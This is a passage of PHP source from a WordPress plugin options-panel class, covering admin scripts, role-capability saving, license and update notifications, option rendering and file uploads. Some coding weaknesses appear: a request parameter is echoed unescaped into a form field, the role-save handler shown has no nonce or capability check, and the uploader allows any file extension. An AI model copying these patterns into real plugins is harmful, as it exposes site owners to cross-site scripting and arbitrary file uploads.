		$goback = $this->query_arg_add( 'pop_open_tabs', urlencode( (isset($_REQUEST['pop_open_tabs'])?$_REQUEST['pop_open_tabs']:'') ), $goback );
		wp_redirect( $goback );
	}

	function handle_role_manage_save(){
		if(isset($_POST['rolemanager']) && is_array($_POST['rolemanager']) && count($_POST['rolemanager'])>0){
			global $wp_roles;
			if( 'WP_Roles' != get_class($wp_roles) )return;
			$all_roles = $wp_roles->roles;
			$editable_roles = apply_filters('editable_roles', $all_roles);
			
			$allowed_roles = array_keys($editable_roles);

			foreach($_POST['rolemanager'] as $id => $roles_to_update){
				if(count($roles_to_update)==0)continue;
				foreach($roles_to_update as $role => $capabilities){
					if(count($capabilities)==0)continue;
					if(!in_array($role,$allowed_roles))continue;
					foreach($capabilities as $cap => $value){					
						if($value==1){
							$wp_roles->add_cap( $role, $cap );
						}else{
							$wp_roles->remove_cap( $role, $cap );
						}
					}
				}
			}			
		}
	}

	function admin_menu(){
		$page_id = add_submenu_page( $this->option_menu_parent,$this->page_title ,$this->menu_text,$this->capability,$this->menu_id,array(&$this,'body'));
		add_action( 'admin_head-'. $page_id, array(&$this,'head') );
	}
	//admin_enqueue_scripts
	function head(){
		do_action('pop_head_'.$this->id);
		wp_print_styles( $this->stylesheet );
		
		wp_print_scripts( 'pop' );

		if(false!==$this->extracss)wp_print_styles($this->extracss);

		wp_print_scripts( 'jquery-ui-tabs' );
		if($this->rangeinput)wp_print_scripts( 'pop-rangeinput');
		if(false!==$this->arrowslider){
			wp_print_styles( 'jquery-arrowslider' );
			wp_print_scripts( 'jquery-arrowslider' );
		}
		if(false!==$this->colorpicker){
			wp_print_styles( $this->colorpicker );
			wp_print_scripts( $this->colorpicker );
		}
		if(false!==$this->farbtastic){
			wp_print_styles( 'farbtastic' );
			wp_print_scripts( 'farbtastic' );
		}
		if(false!==$this->fileuploader){
			wp_print_styles( 'valums-fileuploader' );
			wp_print_scripts( 'valums-fileuploader' );
		}
		if(false!==$this->parentchilddropdown){
			wp_print_scripts( 'jquery-parentchilddropdown' );
		}	
		if(false!==$this->wp_uploader){
			wp_enqueue_media();			
		}			
?>
  <script>
 jQuery(document).ready(function($){
	//----- Horizontal tabs
	if( $(".pop-nav-tab.opened").length==0 ){
		$(".pop-nav-tab").first().addClass('opened');
	}
	
	$(".pop-nav-tab").unbind('click').click(function(e){
		id = $(this).data('slide_id');		
		if( $(this).hasClass('nav-tab-active') && $('#pop-options-cont').find('.pop-nav-tab.nav-tab-active').length==1 ){
			return false;
		}
		
		$('.pop-nav-tab').removeClass('nav-tab-active');
		$('#pop-options-cont').find('.option-title.open').each(function(i,el){
			$(el).next().slideToggle('fast');
			$(el).removeClass('open');
		});
		
		$(this).addClass('nav-tab-active');
		$(id).find('.option-title').toggleClass('open').next().slideToggle();
	});

	$(".pop-nav-tab.opened").trigger('click');
	//-----
	
 	$("#pop-options-cont .option-title").unbind('click').click(function(e){
		$(this).toggleClass('open').next().slideToggle();
	});

 	$("#btn-open-all").click(function(){
		$('#pop-options-cont .option-title').addClass('open').next().slideDown();
	});

	$('#pop-options-form').submit(function(){
		var pop_open_tabs = [];
		$('.toggle-option h3.open').each(function(i,inp){
			pop_open_tabs.push($(inp).parent().attr('id'));
		});
		$('#pop_open_tabs').val(pop_open_tabs.join(','));
	});

	if(location.hash){
		var sel = '#'+location.hash.slice(1)+'.toggle-option .option-title';
		if($(sel).length>0){
			$(sel).click();
		}
	}

	var args = {
		action: 'notifications-<?php echo $this->id ?>'
	};
	$.post(ajaxurl,args,function(data){
		if(data.R=='OK'){
			$('#notifications-<?php echo $this->id ?>').html(data.MSG)
				.find('.fade').removeClass('fade')
			;
		}
	},'json');
<?php if($this->rangeinput): ?>
	/* range input fields */
	$('.pop_rangeinput').pop_rangeinput();
	$('.pt-option-range .handle').mousedown(function(e){$(this).parent().parent().find('.pop_rangeinput').focus();});
<?php endif; ?>
<?php if($this->arrowslider): ?>
	$('.arrow-slider').ArrowSlider();
<?php endif; ?>
	function get_contrast_font_color(hex,color1,color2){
		function giveHex(s){
			s=s.toUpperCase();
			return parseInt(s,16);
		}
		if(hex.length<6||hex.length>6){
			return color1;
		}
		r=giveHex(hex.slice(0,2));
		g=giveHex(hex.slice(2,4));
		b=giveHex(hex.slice(4,6));
		if ( ((r*299 + g*587 + b*114) / 1000) > 125) {
		    return color1;
		} else {
		    return color2;
		}
	}
<?php if(false!==$this->colorpicker):?>
	$('.pop-colorpicker').ColorPicker({
		onSubmit: function(hsb, hex, rgb, el) {
			$(el).val(hex).change();
			$(el).ColorPickerHide();
			//$(el).css('background-color', '#'+hex );
			//$(el).css('color', '#'+get_contrast_font_color(hex,'000000','ffffff') );
		},
		onBeforeShow: function () {
			$(this).ColorPickerSetColor(this.value);
		}
	}).bind('keyup', function(e){
		$(this).ColorPickerSetColor(this.value);
		 if (e.keyCode == 27) { $(this).ColorPickerHide(); }
	}).bind('change',function(e){
		$(this).css('background-color', '#'+this.value );
		$(this).css('color', '#'+get_contrast_font_color(this.value,'000000','ffffff') );
	}).change();
<?php endif;?>
<?php if(false!==$this->farbtastic):?>
	$('.pop-farbtastic').each(function(i,o){
		$(this).farbtastic($(this).attr('rel')).hide();
	});
	$('.farbtastic-choosecolor').click(function(e){
		var helper = $(this).parent().find('.pop-farbtastic');
		if(helper.is(':visible')){
			helper.slideUp();
			$(this).addClass('show-colorpicker').removeClass('hide-colorpicker');
		}else{
			helper.slideDown();
			$(this).addClass('hide-colorpicker').removeClass('show-colorpicker');
		}
		var tmp = $(this).attr('rel');
		$(this).attr('rel',$(this).attr('title'));
		$(this).attr('title',tmp);
	});
	$('.farbtastic-choosecolor').mousedown(function(e){$(this).parent().find('input').trigger('focus');});
<?php endif;?>
<?php if(false!==$this->fileuploader):?>
	var pop_uploader = new Array();
	$('.pop-fileuploader').each(function(i,inp){
		var id = $(inp).attr('rel');
		pop_uploader[pop_uploader.length] = new qq.FileUploader({
		    element: $(inp)[0],
		    action: ajaxurl,
			params: {
				action: 'pop_uploader-<?php echo $this->id ?>',
				id: id
			},
			onSubmit: function(_id, fileName){
				$(id+'_msg').addClass('loading');
			},
			onComplete: function(_id, fileName, responseJSON){
				if(responseJSON.success){
					$(responseJSON.id).val(responseJSON.url).trigger('change');
				}
				$(id+'_msg').removeClass('loading');
			},
			onProgress: function(){

			},
			showMessage: function(message){
				$(id + '_msg').html(message);
			}
		});
	});
	$('.pop-input-fileuploader').change(function(e){
		var sel =  $(this).attr('rel');
		var src = $(this).val();
		var dcurl_sel = '#' + $(this).attr('id') + '_dcurl';
		$(sel).html('');
		if(src!=''){
		 src = src.replace('{pluginurl}','<?php echo $this->pluginurl?>');
		 src = src.replace('{dcurl}', $(dcurl_sel).val() );
		 $(sel).append( $('<img />').attr('src',src ).addClass('pop-uploader-preview') );
		}
	}).trigger('change');
<?php endif;?>
<?php if(false!==$this->parentchilddropdown):?>
	$('.parent-child-dropdown').ParentChildDropdown();
<?php endif; ?>
	//console.log( $('.pop_groupcontrol:checked').length );
	$('.pop_groupcontrol:checked').trigger('click');
	$('select.pop_groupcontrol').trigger('change');

	$('.pop-preview-item').each(function(i,inp){
		var item = this;
		var arr = $(this).attr('rel').split("|");
		var sel = arr[0];
		if(arr[0]!='')$(arr[0]).focus(function(e){$(item).parent().find('.pop-preview-item').hide();$(item).show();});
	});
	$('.pop-preview-items .pop-preview-item:first-child').show();
 });
</script>
<?php

		add_action( 'admin_notices', array(&$this,'pop_update_notice') );
		do_action('pop_admin_head_'.$this->id);
	}

	function pop_update_notice(){
		echo sprintf("<div id=\"notifications-%s\"></div>",$this->id);
	}

	function force_update_check(){
		$current = get_transient( 'update_plugins' );
		$current->last_checked = 0;
		set_transient( 'update_plugins', $current );
		wp_update_plugins();	
	}

	function handle_update_check( $version, $current_version ){
		if( false !== $this->pluginslug ){
			$rh_versions = get_option('rh_versions',array());
			$rh_versions = is_array($rh_versions) ? $rh_versions : array();
			$rh_versions[$this->pluginslug] = isset($rh_versions[$this->pluginslug]) ? $rh_versions[$this->pluginslug] : $current_version ;

			if( isset($rh_versions[$this->pluginslug]) && $version > $rh_versions[$this->pluginslug] ){
				$this->force_update_check();
			}
			$rh_versions[$this->pluginslug] = $version;//this is to avoid querying wordpress updates every options screen load.
			update_option( 'rh_versions', $rh_versions );
		}
	}
	
	function pop_notifications(){
		$url = sprintf('%s/?rh_latest_version=%s&site_url=%s&license_key=%s',
			$this->api_url,
			$this->notification->plugin_code,urlencode(site_url('/')),urlencode($this->get_license_key()));
		if($this->theme){$url.="&theme=1";}	
		if(!class_exists('righthere_service'))require_once 'class.righthere_service.php';
		$rh = new righthere_service();
		$r = $rh->rh_service($url);

		if( false===$this->pluginfile ){
			$update_url = false===$this->pluginslug ? $r->url : admin_url('/update-core.php?force-check=1') ;
		}else{
			$update_url = wp_nonce_url(self_admin_url('update.php?action=upgrade-plugin&plugin=' . $this->pluginfile), 'upgrade-plugin_' . $this->pluginfile);
		}
		
		if(false!==$r){
			if(!$this->theme){
				if(is_object($r)&&property_exists($r,'version')){
					if($r->version>$this->notification->plugin_version){					
						$this->handle_update_check( $r->version, $this->notification->plugin_version );
						$message = sprintf("<div class=\"updated fade\"><p><strong>%s</strong></p></div>",$this->notification->message);
						$response = (object)array(
							'R'		=> 'OK',
							'MSG'	=> sprintf($message,$r->version,$update_url)
						);
						die(json_encode($response));
					}else{
						die(json_encode((object)array('R'=>'ERR','MSG'=> __('Plugin is latest version.','pop') )));
					}
				}else{
					die(json_encode((object)array('R'=>'ERR','MSG'=> __('Invalid response format.','pop') )));
				}
			}
		}
		die(json_encode((object)array('R'=>'ERR','MSG'=> __('Notification service is not available.','pop') )));
	}

	function get_saved_options(){
		$var = $this->options_varname.'_saved';
		$options = get_option($var);
		return is_array($options)?$options:array();
	}

	function filter_loaded_options($options){
		if(isset($_REQUEST['pop_preview'])){
			$index = intval($_REQUEST['pop_preview']);
			$saved = $this->get_saved_options();
			$saved = array_reverse($saved);
			if(isset($saved[$index]) && is_object($saved[$index]) && property_exists($saved[$index],'options') && is_array($saved[$index]->options) && count($saved[$index]->options)>0){
				foreach($saved[$index]->options as $option_name => $option_value){
					$options[$option_name]=$option_value;
				}
			}
		}
		return $options;
	}

	function cb_sort_options($a, $b){
		//-priorize in the beginning
		if( property_exists($a,'priority') && property_exists($b,'priority') ){
			if( $a->priority < $b->priority ){
				return -1;
			}else if( $a->priority > $b->priority ){
				return 1;
			}else{
				return 0;
			}
		}else if( property_exists($a,'priority') ){
			return -1;
		}else if( property_exists($b,'priority') ){
			return 1;
		}
		//-priorize in the end
		if( property_exists($a,'priority_end') && property_exists($b,'priority_end') ){
			if( $a->priority_end < $b->priority_end ){
				return 1;
			}else if( $a->priority_end > $b->priority_end ){
				return -1;
			}else{
				return 0;
			}
		}else if( property_exists($a,'priority_end') ){
			return 1;
		}else if( property_exists($b,'priority_end') ){
			return -1;
		}		
		
		return strcmp( $a->label, $b->label );
	}
	
	function body(){
		if(!class_exists('pop_input'))require_once 'class.pop_input.php';
		$pop_input = new pop_input(array('farbtastic'=>$this->farbtastic));
		$options = apply_filters('pop-options_'.$this->id,array(),$this->section);
		$existing_options = $this->get_options();
		$existing_options = is_array($existing_options)?$existing_options:array();
		$existing_options = apply_filters('pop-existing-options_'.$this->id,$existing_options);
?>
<div class="wrap">
<?php screen_icon('options-general'); ?>
<h2><?Php echo $this->menu_text?></h2>
<?php echo isset($_REQUEST['updated'])?'<div class="updated">'.__('Options updated.','pop').'</div>':'' ?>
<div id="sys_msg"></div>
<div id="pop-options-cont" class="pop-layout-<?php echo $this->layout?> <?php echo do_action('pop-options-cont-class')?>">
<?php
		if(count($options)>0){
			if( $this->sort ){
				uasort( $options, array( &$this, 'cb_sort_options') );
			} 
			$open_tabs = isset($_REQUEST['pop_open_tabs'])?$_REQUEST['pop_open_tabs']:false;
			$open_tabs = false===$open_tabs?false:(''==trim($open_tabs)?array():explode(',',$open_tabs));
			$map_save_fields = array();
			$save_fields = array();
			echo "<form id=\"pop-options-form\" enctype=\"multipart/form-data\" method=\"post\" action=\"\">";
			echo '<input type="hidden" id="pop_plugin_id" name="pop_plugin_id" value="'.$this->id.'" />';
			echo '<input type="hidden" name="'.$this->id.'_options" value="1" />';
			//echo '<input type="hidden" id="tabs_selected_tab" name="tabs_selected_tab" value="" />';
			echo sprintf('<input type="hidden" id="pop_open_tabs" name="pop_open_tabs" value="%s" />',isset($_REQUEST['pop_open_tabs'])?$_REQUEST['pop_open_tabs']:'');
			wp_nonce_field($this->id);
			//----
			if( 'horizontal' == $this->layout ){
				$have_open_tab = false;
				echo '<h2 class="nav-tab-wrapper pop-nav-tab-wrapper">';
				foreach($options as $tab){
					$open = false;
					if(!$have_open_tab){
						if(false===$open_tabs){
							$open = property_exists($tab,'open')&&$tab->open?'open':'';
						}else{
							$open = in_array($tab->id,$open_tabs)?'open':'';
						}
						$have_open_tab = $open;				
					}
	
					echo sprintf('<a href="javascript:void(0);" data-slide_id="%s" class="pop-nav-tab nav-tab %s">%s</a>',
						'#'.$tab->id,
						( $open ? 'opened' : '' ),
						$tab->label
					);			
				}
				echo '</h2>';			
			}
			//----
			foreach($options as $tab){
				if(false===$open_tabs){
					$open = property_exists($tab,'open')&&$tab->open?'open':'';
				}else{
					$open = in_array($tab->id,$open_tabs)?'open':'';
				}
				$starting_save_fields = $save_fields;
				$tab->theme_option = property_exists($tab,'theme_option')? $tab->theme_option : true;
				$tab->plugin_option = property_exists($tab,'plugin_option')? $tab->plugin_option : true;
				if($this->theme&&!$tab->theme_option){
					continue;
				}else if(!$tab->plugin_option){
					continue;
				}

				echo sprintf("<div id=\"%s\" class=\"toggle-option\">",$tab->id);
				echo sprintf("<h3 class=\"option-title %s %s\"><span class=\"pop-option-title-icon\"></span><span class=\"pop-option-title\">%s</span><span class=\"pop-right\">%s</span></h3>", $open, (isset($this->classes['panel_head'])?$this->classes['panel_head']:''),$tab->label, @$tab->right_label );
				echo sprintf("<div class=\"option-content %s %s\">",$open,(isset($this->classes['panel_body'])?$this->classes['panel_body']:''));
				if(count($tab->options)>0){
					foreach($tab->options as $i => $o){
						$o->theme_option = property_exists($o,'theme_option')? $o->theme_option : true;
						$o->plugin_option = property_exists($o,'plugin_option')? $o->plugin_option : true;
						if($this->theme&&!$o->theme_option){
							continue;
						}else if(!$o->plugin_option){
							continue;
						}
						//----------
						$o->type = property_exists($o,'type')?$o->type:'';
						$method = "_".$o->type;
						if(!method_exists($pop_input,$method))
							continue;

						if(true===@$o->load_option){
							$option_varname = $pop_input->get_option_name($tab,$i,$o);
							$o->value = isset($existing_options[$option_varname])?$existing_options[$option_varname]:(property_exists($o,'default')?$o->default:'');
						}
						
						if(property_exists($o,'esc_attr') && $o->esc_attr){
							$o->value = esc_attr($o->value);
						}
						
						echo $pop_input->translucent_description(@$o->description);
						if(in_array($o->type,array('description',))){

						}else if(in_array($o->type,array('callback','div_start','div_end','preview'))){
							$o->existing_options = $existing_options;
							echo $pop_input->$method($tab,$i,$o,$save_fields);
						}else{
							$class = property_exists($o,'ptclass')?$o->ptclass:'';
							echo sprintf("<div class=\"pt-option pt-option-%s %s\">",$o->type,$class);
							if(in_array($o->type,array('checkbox'))){
								echo sprintf("%s",$pop_input->$method($tab,$i,$o,$save_fields));
								echo sprintf("<span class=\"pt-checkbox-label\">%s</span>",$o->label);
							}else{
								if(property_exists($o,'label')&&!in_array($o->type,array('label','subtitle','hr','button','submit','range','textarea'))){
									echo sprintf("<span class=\"pt-label pt-type-%s\">%s</span>",$o->type,$o->label);
								}
								echo sprintf("%s",$pop_input->$method($tab,$i,$o,$save_fields));
							}
							//------------
							//echo "<div class=\"pt-clear\"></div>";
							echo "</div>";//close pt-option
						}
					}
				}
				echo "</div>";//close option-content
				echo "</div>";//close toggle-option
				$added_save_fields = array_diff($save_fields,$starting_save_fields);
				$map_save_fields[$tab->id]=$added_save_fields;
			}

			echo "<div class=\"bottom-controls\">";
			echo "<input id=\"btn-open-all\" class=\"button-secondary\" type=\"button\" value=\"".__('Open all','pop')."\" />";
			echo $pop_input->_submit(null,null,(object)array('class'=>'button-primary','label'=>__('Save all','pop')));
			echo "</div>";

			echo '<input type="hidden" name="action" value="update" />';
			echo sprintf('<input type="hidden" name="page_%s" value="%s" />',$this->id,$this->get_save_fields($save_fields));

			do_action('pop_main_controls');
			do_action('pop_main_controls_'.$this->id);

			echo "</form>";
		}
?>
</div>
</div>
<?php
		global $rh_php_commons;
		echo sprintf("<div class=\"pop-version\"><i>%s (%s)</i></div>",
			sprintf(__('Options panel version %s','pop'),
				isset($rh_php_commons['options-panel']['included'])?$rh_php_commons['options-panel']['included']->version:$this->version
				),
			$this->id
		);

		do_action('pop_body_'.$this->id);
	}

	function get_save_fields($save_fields){
		if(is_array($save_fields)&&count($save_fields)>0){
			$tmp = array();
			foreach($save_fields as $field){
				if(in_array($field,$tmp))continue;
				$tmp[]=str_replace("[]",'',$field);
			}
			return implode(",",$tmp);
		}else{
			return '';
		}
	}

	function get_options(){
		$options = get_option($this->options_varname);
		return is_array($options)?$options:array();
	}

	function get_option($name){
		$options = $this->get_options();
		return isset($options[$name])?$options[$name]:'';
	}

	function get_license_key(){
		$licenses = $this->get_option('license_keys');
		if(is_array($licenses)&&count($licenses)>0){
			foreach($licenses as $license){
				if(in_array($license->item_type,array('plugin','theme'))){
					return $license->license_key;
				}
			}
		}
		$license_key = $this->get_option('license_key');
		if(trim($license_key)!=''){
			return $license_key;
		}
		return '';
	}

	function pop_uploader(){
		if(!current_user_can($this->capability)){
			return array('error' => __('No access','pop') );		
		}
		require_once('class.pop_uploader.php');
		$allowedExtensions = array();
		$sizeLimit = 10 * 1024 * 1024;
		$uploader = new pop_qqFileUploader($allowedExtensions, $sizeLimit);
		$result = $uploader->handleUpload();
		echo htmlspecialchars(json_encode($result), ENT_NOQUOTES);
		die();
	}

	function query_arg_add() {
		$ret = '';
		$args = func_get_args();
		if ( is_array( $args[0] ) ) {
			if ( count( $args ) < 2 || false === $args[1] )
				$uri = $_SERVER['REQUEST_URI'];
			else
				$uri = $args[1];
		} else {
			if ( count( $args ) < 3 || false === $args[2] )
				$uri = $_SERVER['REQUEST_URI'];
			else
				$uri = $args[2];
		}
	
		if ( $frag = strstr( $uri, '#' ) )
			$uri = substr( $uri, 0, -strlen( $frag ) );
		else
			$frag = '';
	
		if ( 0 === stripos( $uri, 'http://' ) ) {
			$protocol = 'http://';
			$uri = substr( $uri, 7 );
		} elseif ( 0 === stripos( $uri, 'https://' ) ) {
			$protocol = 'https://';
			$uri = substr( $uri, 8 );
		} else {
			$protocol = '';
		}
	
		if ( strpos( $uri, '?' ) !== false ) {
			list( $base, $query ) = explode( '?', $uri, 2 );
			$base .= '?';
		} elseif ( $protocol || strpos( $uri, '=' ) === false ) {
			$base = $uri . '?';
			$query = '';
		} else {
			$base = '';
			$query = $uri;
		}
	
		wp_parse_str( $query, $qs );
		$qs = urlencode_deep( $qs ); // this re-URL-encodes things that were already in the query string
		if ( is_array( $args[0] ) ) {
			$kayvees = $args[0];
			$qs = array_merge( $qs, $kayvees );
		} else {
			$qs[ $args[0] ] = $args[1];
		}
	
		foreach ( $qs as $k => $v ) {
			if ( $v === false )
				unset( $qs[$k] );
		}
	
		$ret = build_query( $qs );
		$ret = trim( $ret, '?' );
		$ret = preg_replace( '#=(&|$)#', '$1', $ret );
		$ret = $protocol . $base . $ret . $frag;
		$ret = rtrim( $ret, '?' );
		return $ret;
	}	
}
endif;
?>
